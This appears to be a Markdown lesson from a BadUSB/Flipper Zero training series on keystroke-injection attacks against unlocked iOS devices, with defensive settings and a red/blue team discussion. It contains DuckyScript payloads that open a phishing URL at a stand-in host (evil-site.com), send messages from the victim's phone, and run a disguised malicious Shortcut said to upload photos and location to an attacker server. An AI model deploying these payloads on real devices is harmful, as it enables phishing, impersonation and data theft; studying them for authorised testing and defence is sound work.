# FZ-I12: iOS Shortcuts Attack

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-I12 |
| **Name** | iOS Shortcuts Attack |
| **Difficulty** | Intermediate |
| **Target OS** | iOS 14+ |
| **Requirements** | Lightning/USB-C camera adapter |
| **MITRE ATT&CK** | T1204 (User Execution) |

## Important: iOS USB Attack Limitations

iOS is the most restrictive platform for BadUSB attacks. Understanding limitations is crucial.

### iOS Security Model

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        iOS USB ATTACK REALITY                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  WHAT WORKS:                        WHAT DOESN'T:                           │
│  ───────────                        ──────────────                          │
│  ✓ Keyboard input                   ✗ Direct file access                    │
│  ✓ Spotlight search                 ✗ App installation                      │
│  ✓ Opening apps                     ✗ Settings changes                      │
│  ✓ Typing text                      ✗ Bypassing lock screen                 │
│  ✓ Basic navigation                 ✗ Background execution                  │
│                                     ✗ Shell access                          │
│                                     ✗ Arbitrary code execution              │
│                                                                              │
│  iOS trusts keyboard input but sandboxes EVERYTHING else.                   │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Hardware Requirements
- Lightning to USB Camera Adapter (or USB-C for newer iPads)
- External power recommended (adapter can be power-hungry)
- Device must be unlocked

---

## The Payload

```ducky
REM =============================================
REM INTERMEDIATE: iOS Shortcuts Attack
REM Target: iOS 14+
REM Action: Opens Shortcuts app, navigates
REM Requirements: Camera adapter, unlocked device
REM Skill: Intermediate
REM NOTE: Very limited due to iOS security
REM =============================================

REM iOS requires very long delays
DELAY 5000

REM Press Home/App Switcher key (CMD+H on external keyboard)
GUI h
DELAY 1000

REM Open Spotlight search (CMD+Space)
GUI SPACE
DELAY 1500

REM Search for Shortcuts app
STRING shortcuts
DELAY 1000
ENTER
DELAY 3000

REM iOS Shortcuts app is now open
REM We can navigate with keyboard shortcuts

REM Tab through interface
TAB
TAB
TAB
ENTER
```

---

## What's Actually Possible on iOS

### Keyboard Shortcuts Work

| Shortcut | Action | DuckyScript |
|----------|--------|-------------|
| Cmd+Space | Spotlight | GUI SPACE |
| Cmd+H | Home | GUI h |
| Cmd+Tab | App Switcher | GUI TAB |
| Cmd+Shift+3 | Screenshot | GUI SHIFT 3 |
| Cmd+Q | Quit App | GUI q |

### App-Specific Shortcuts

**Safari:**
| Shortcut | Action |
|----------|--------|
| Cmd+T | New Tab |
| Cmd+L | Address Bar |
| Cmd+R | Reload |

**Notes:**
| Shortcut | Action |
|----------|--------|
| Cmd+N | New Note |
| Cmd+B | Bold |

---

## Realistic iOS Attack Scenarios

### Scenario 1: Spotlight Search Abuse
```ducky
REM Open Safari to phishing URL
DELAY 5000
GUI SPACE
DELAY 1500
STRING https://evil-site.com/ios-login
ENTER
```

### Scenario 2: Send iMessage
```ducky
DELAY 5000
GUI SPACE
DELAY 1500
STRING messages
ENTER
DELAY 3000
GUI n
DELAY 1000
STRING +1234567890
TAB
DELAY 500
STRING Message from your hacked iPhone!
DELAY 500
GUI ENTER
```

### Scenario 3: Create Note
```ducky
DELAY 5000
GUI SPACE
DELAY 1500
STRING notes
ENTER
DELAY 3000
GUI n
DELAY 1000
STRING BadUSB was here - $(date)
```

### Scenario 4: Siri Activation
```ducky
DELAY 3000
REM Long press Home equivalent
REM This varies by device/settings
GUI SPACE
DELAY 500
GUI SPACE
DELAY 2000
STRING send a message to mom saying I will be late
DELAY 500
ENTER
```

---

## iOS Shortcuts App Integration

The Shortcuts app is the most powerful tool for iOS automation:

### Pre-configured Shortcut Attack
If you can pre-install a malicious Shortcut on the device:

```ducky
REM Run a shortcut by name
DELAY 5000
GUI SPACE
DELAY 1500
STRING run system backup
ENTER
```

The shortcut named "system backup" could:
- Upload photos to attacker server
- Send location data
- Export contacts
- Capture screen recordings

### Creating a Shortcut via Keyboard
This is extremely tedious but possible for demonstration:

```ducky
REM Open Shortcuts
DELAY 5000
GUI SPACE
DELAY 1500
STRING shortcuts
ENTER
DELAY 3000

REM Create new shortcut (Cmd+N)
GUI n
DELAY 2000

REM Search for action
STRING get current location
ENTER
DELAY 1000

REM Add another action
GUI SHIFT a
DELAY 1000
STRING send message
ENTER

REM This is very slow and impractical for real attacks
```

---

## Red Team Perspective

### iOS Attack Limitations

| Attack Type | Feasibility | Notes |
|-------------|-------------|-------|
| Data Exfil | Very Low | No file access |
| Persistence | None | Can't install anything |
| Credential Theft | Low | Can open fake login pages |
| Social Engineering | Medium | Can send messages, make calls |
| Surveillance | Very Low | No background access |

### Why iOS is Hard

1. **Sandboxing**: Every app is isolated
2. **No Terminal**: Can't run commands
3. **No Sideloading**: Can't install apps
4. **Locked Bootloader**: Can't modify system
5. **Secure Enclave**: Hardware-protected keys

### Realistic iOS Goals

- Demonstrate physical access risk
- Social engineering (send texts/emails)
- Open phishing URLs
- Annoyance/awareness (take screenshots, change settings)

---

## Blue Team Perspective

### iOS Protections

1. **Accessory Authentication**
   - "Trust This Computer?" prompt for data
   - No prompt for keyboards (vulnerability)

2. **USB Restricted Mode**
   - After 1 hour locked, USB accessories disabled
   - Settings → Face ID & Passcode → USB Accessories

3. **MDM Controls**
   - Block external keyboards
   - Restrict USB accessories

### Recommendations

```
Settings → Face ID & Passcode → USB Accessories → OFF
Settings → Face ID & Passcode → Require Attention for Face ID → ON
Use MDM to restrict accessory connections
```

---

## Practice Exercises

### Exercise 1: Open Website
Create a payload that opens Safari to a specific URL.

### Exercise 2: Take Screenshot
```ducky
DELAY 5000
GUI SHIFT 3
```

### Exercise 3: Search and Navigate
Open the Settings app and navigate using Tab/Arrow keys.

---

## Payload File

Save as `FZ-I12_iOS_Shortcuts.txt`:

```ducky
REM FZ-I12: iOS Shortcuts Attack
REM Very limited - iOS is highly secure
DELAY 5000
GUI SPACE
DELAY 1500
STRING safari
ENTER
DELAY 3000
GUI l
DELAY 500
STRING https://example.com
ENTER
```

---

## iOS Attack Summary

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                            iOS BADUSB REALITY                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  iOS is the HARDEST platform to attack via BadUSB.                          │
│                                                                              │
│  You can:                                                                    │
│  • Type text                                                                 │
│  • Open apps via Spotlight                                                   │
│  • Use keyboard shortcuts                                                    │
│  • Social engineer (send messages)                                           │
│                                                                              │
│  You cannot:                                                                 │
│  • Access files                                                              │
│  • Run code                                                                  │
│  • Install anything                                                          │
│  • Achieve persistence                                                       │
│                                                                              │
│  For serious iOS testing, use:                                               │
│  • MDM testing tools                                                         │
│  • Jailbroken test devices                                                   │
│  • App-specific vulnerabilities                                              │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

[← FZ-I11 Android Recon](FZ-I11_Android_Recon.md) | [Back to Intermediate](README.md) | [Next: FZ-I13 Linux Persistence →](FZ-I13_Linux_Persistence.md)
